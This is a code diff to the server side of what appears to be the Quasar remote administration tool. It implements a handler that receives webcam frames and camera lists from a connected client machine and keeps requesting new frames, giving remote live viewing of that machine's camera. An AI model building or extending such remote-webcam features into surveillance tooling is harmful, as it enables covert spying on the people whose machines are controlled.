@@ -1,20 +1,24 @@
 ﻿using Mono.Cecil.Cil;
+using Org.BouncyCastle.Bcpg;
 using Quasar.Common.Messages;
 using Quasar.Common.Networking;
+using Quasar.Common.Video;
 using Quasar.Common.Video.Codecs;
 using Quasar.Server.Networking;
 using System;
 using System.Collections.Generic;
 using System.Drawing;
+using System.IO;
 using System.Linq;
+using System.Net.Sockets;
 using System.Text;
 using System.Threading.Tasks;
 
 namespace Quasar.Server.Messages
 {
-    internal class RemoteWebcamHandler : MessageProcessorBase<Bitmap>, IDisposable
+    internal class RemoteWebcamHandlerS : MessageProcessorBase<Bitmap>, IDisposable
     {
-        public RemoteWebcamHandler(Client client) : base(true)
+        public RemoteWebcamHandlerS(Client client) : base(true)
         {
             _client = client;
         }
@@ -63,6 +67,35 @@ namespace Quasar.Server.Messages
         private readonly object _sizeLock = new object();
 
         /// <summary>
+        /// The local resolution, see <seealso cref="LocalResolution"/>.
+        /// </summary>
+        private Size _localResolution;
+
+        /// <summary>
+        /// The local resolution in width x height. It indicates to which resolution the received frame should be resized.
+        /// </summary>
+        /// <remarks>
+        /// This property is thread-safe.
+        /// </remarks>
+        public Size LocalResolution
+        {
+            get
+            {
+                lock (_sizeLock)
+                {
+                    return _localResolution;
+                }
+            }
+            set
+            {
+                lock (_sizeLock)
+                {
+                    _localResolution = value;
+                }
+            }
+        }
+
+        /// <summary>
         /// The video stream codec used to decode received frames.
         /// </summary>
         private UnsafeStreamCodec _codec;
@@ -72,7 +105,7 @@ namespace Quasar.Server.Messages
         /// </summary>
         /// <param name="sender">The message processor which raised the event.</param>
         /// <param name="value">All currently available displays.</param>
-        public delegate void DisplaysChangedEventHandler(object sender, int value);
+        public delegate void DisplaysChangedEventHandler(object sender, Dictionary<string, List<Resolution>> value);
 
         /// <summary>
         /// Raised when a display changed.
@@ -82,6 +115,19 @@ namespace Quasar.Server.Messages
         /// <see cref="System.Threading.SynchronizationContext"/> chosen when the instance was constructed.
         /// </remarks> 
         public event DisplaysChangedEventHandler DisplaysChanged;
+
+        /// <summary>
+        /// Reports changed displays.
+        /// </summary>
+        /// <param name="value">All currently available displays.</param>
+        private void OnDisplaysChanged(GetWebcamsResponse value)
+        {
+            SynchronizationContext.Post(val =>
+            {
+                DisplaysChangedEventHandler handler = DisplaysChanged;
+                handler?.Invoke(this, (Dictionary<string, List<Resolution>>)val);
+            }, value.Webcams);
+        }
 
         /// <summary>
         /// Ends receiving frames from the client.
@@ -94,14 +140,41 @@ namespace Quasar.Server.Messages
             }
         }
 
-        public override bool CanExecute(IMessage message)
+        public override bool CanExecute(IMessage message) => message is GetWebcamResponse || message is GetWebcamsResponse;
+        
+        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender); //inheritdoc
+
+        public override void Execute(ISender sender, IMessage message)
         {
-            throw new NotImplementedException();
+            switch (message)
+            {
+                case GetWebcamResponse d:
+                    Execute(sender, d);
+                    break;
+                case GetWebcamsResponse m:
+                    Execute(sender, m);
+                    break;
+            }
         }
 
-        public override bool CanExecuteFrom(ISender sender)
+        private void Execute(ISender client, GetWebcamResponse message)
         {
-            throw new NotImplementedException();
+            lock (_syncLock)
+            {
+                using (MemoryStream ms = new MemoryStream(message.Image))
+                {
+                    Bitmap img = new Bitmap(ms);
+                    OnReport(new Bitmap(img, LocalResolution));
+                }
+                message.Image = null;
+                client.Send(new GetWebcam { Webcam = message.Webcam, Resolution = message.Resolution });
+            }
+
+                
+        }
+        private void Execute(ISender client, GetWebcamsResponse message)
+        {
+            OnDisplaysChanged(message);
         }
 
         public void Dispose()
@@ -121,9 +194,5 @@ namespace Quasar.Server.Messages
             }
         }
 
-        public override void Execute(ISender sender, IMessage message)
-        {
-            throw new NotImplementedException();
-        }
     }
 }
